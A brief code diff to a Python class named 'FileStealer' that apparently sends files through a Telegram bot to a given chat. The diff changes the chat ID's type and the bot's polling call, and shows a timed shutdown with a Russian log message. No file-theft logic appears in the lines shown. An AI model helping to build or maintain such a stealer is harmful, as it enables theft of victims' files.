@@ -17,7 +17,7 @@ class FileStealer:
     def __init__(
         self,
         token: str,
-        chat_id: str,
+        chat_id: int,
         folder_name: str = FOLDER_NAME
     ):
         self.chat_id = chat_id
@@ -74,5 +74,5 @@ class FileStealer:
             self.bot.stop_polling()
         threading.Timer(lifetime_seconds, shutdown).start()
         logging.info('Бот запущен, время жизни = %s сек', lifetime_seconds)
-        self.bot.polling(none_stop=True)
-        # self.bot.polling(timeout=60)
+        # self.bot.polling(none_stop=True)
+        self.bot.polling(timeout=60)
